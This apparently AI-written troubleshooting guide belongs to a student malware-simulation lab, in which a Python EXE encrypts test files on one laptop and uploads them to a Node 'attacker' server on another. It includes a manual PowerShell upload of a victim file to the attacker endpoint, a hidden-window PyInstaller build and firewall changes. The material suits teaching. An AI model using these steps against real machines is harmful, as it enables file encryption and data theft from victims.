# 🔧 Troubleshooting Guide - File Transfer Not Working

## ❌ **Problem: Laptop B runs but no files uploaded**

### **Common Causes & Solutions:**

---

## 1️⃣ **SERVER IP is Wrong**

### **Check:**
```powershell
# On Laptop A, run:
ipconfig
```

Look for **IPv4 Address** (e.g., `192.168.1.100` or `10.x.x.x`)

### **Fix:**
**IMPORTANT: The EXE has SERVER_IP hardcoded. You MUST:**
1. Update `main.py` with correct IP:
   ```python
   SERVER_IP = "192.168.1.100"  # <-- Your actual Laptop A IP
   ```
2. Rebuild EXE:
   ```powershell
   python -m PyInstaller --onefile --windowed --name "malware_simulation" main.py
   ```
3. Send new EXE to Laptop B

---

## 2️⃣ **Server Not Running on Laptop A**

### **Check:**
```powershell
# On Laptop A, check if server is running:
netstat -ano | findstr :5000
```

### **Fix:**
**Start the server:**
```powershell
cd "E:\cadt\y3-term1\cyber-Security\cyber-project\cyber_project_T1Y3\source\Attacker"
node server.js
```

**You should see:**
```
🚀 Attacker Server is running!
📍 Server URL: http://[YOUR_IP]:5000
```

---

## 3️⃣ **VictimFiles Folder Doesn't Exist on Laptop B**

### **Check:**
```powershell
# On Laptop B, verify folder exists:
Test-Path "C:\MalwareLab\VictimFiles"
```

### **Fix:**
**Create the folder:**
```powershell
mkdir "C:\MalwareLab\VictimFiles"
New-Item "C:\MalwareLab\VictimFiles\ALLOW_SIMULATION.txt" -Force

# Add sample files
@"
Test data 1
"@ | Out-File "C:\MalwareLab\VictimFiles\document1.txt"

@"
Test data 2
"@ | Out-File "C:\MalwareLab\VictimFiles\document2.txt"
```

---

## 4️⃣ **Firewall Blocking Port 5000**

### **Check:**
```powershell
# On Laptop B, test connection to Laptop A:
Test-NetConnection -ComputerName 192.168.1.100 -Port 5000
```

### **Should see:**
```
TcpTestSucceeded : True
```

### **Fix (if TcpTestSucceeded is False):**
**Allow port 5000 on Laptop A:**
```powershell
New-NetFirewallRule -DisplayName "Allow Port 5000" `
                     -Direction Inbound `
                     -LocalPort 5000 `
                     -Protocol TCP `
                     -Action Allow
```

---

## 5️⃣ **Script Ran but No Log File Created**

### **Check:**
```powershell
# On Laptop B, check log:
Test-Path "C:\MalwareLab\malware_log.txt"
Get-Content "C:\MalwareLab\malware_log.txt"
```

### **If log doesn't exist:**
- Script didn't run at all
- Check if EXE executed properly
- Look for error messages

---

## 6️⃣ **Test Connection Manually**

### **On Laptop B, test if server is reachable:**

```powershell
# Test 1: Ping the server
ping 192.168.1.100

# Test 2: Test port connectivity
Test-NetConnection -ComputerName 192.168.1.100 -Port 5000 -InformationLevel Detailed

# Test 3: Call the ping endpoint
Invoke-WebRequest -Uri "http://192.168.1.100:5000/ping"

# Should return: {"message":"Server is alive"}
```

---

## 7️⃣ **Manual Test Upload**

### **On Laptop B, manually upload a test file:**

```powershell
# Create a test file
@"
This is a test file
"@ | Out-File "C:\MalwareLab\test.txt"

# Upload it manually
$file = "C:\MalwareLab\test.txt"
$url = "http://192.168.1.100:5000/upload"
$form = @{ file = Get-Item $file }
Invoke-WebRequest -Uri $url -Method Post -Form $form
```

**If this works, manual upload succeeds but Python doesn't:**
- Issue is with Python script on Laptop B
- Check if Python/requests module is installed

---

## 📋 **Step-by-Step Debugging**

### **On Laptop A:**
```powershell
# 1. Check your IP
ipconfig

# 2. Make sure node.js is installed
node --version

# 3. Install dependencies
cd source\Attacker
npm install

# 4. Start server
node server.js

# 5. Leave it running! Don't close the terminal
```

### **On Laptop B:**
```powershell
# 1. Update main.py with Laptop A's correct IP
# 2. Rebuild EXE (if using Python directly)
# 3. Verify VictimFiles folder exists
# 4. Create test files
# 5. Run EXE or python script
# 6. Check if uploads appear on Laptop A

# 7. If nothing works, test manually:
Test-NetConnection -ComputerName 192.168.1.100 -Port 5000
```

---

## ✅ **Verification Checklist**

- [ ] Laptop A IP address is correct
- [ ] Server is running on Laptop A: `node server.js`
- [ ] Port 5000 is not blocked by firewall
- [ ] VictimFiles folder exists on Laptop B: `C:\MalwareLab\VictimFiles\`
- [ ] ALLOW_SIMULATION.txt exists in VictimFiles
- [ ] Test files exist (document1.txt, etc.)
- [ ] Can ping Laptop A from Laptop B
- [ ] Can access port 5000 from Laptop B
- [ ] Python script/EXE runs without errors
- [ ] Check `C:\MalwareLab\malware_log.txt` for error messages

---

## 🎯 **If Still Not Working:**

### **Option 1: Run Python directly (not EXE)**
```powershell
# On Laptop B:
pip install requests cryptography
python main.py
```

### **Option 2: Check for error messages**
```powershell
# Run python script and watch for errors
python main.py
# It should print: "Files Encrypted + Transfer Attempted"
```

### **Option 3: Review the log file**
```powershell
# Check what happened:
Get-Content "C:\MalwareLab\malware_log.txt"
```

---

## 💡 **Most Common Issue:**

**SERVER_IP in main.py is wrong!**

The script has a hardcoded IP:
```python
SERVER_IP = "192.168.1.100"  # If this is WRONG, nothing will upload!
```

**Solution:**
1. Find correct IP: `ipconfig` on Laptop A
2. Update main.py
3. Rebuild EXE or run Python script directly

---

**Try these solutions and let me know which one fixes it! 🔧**
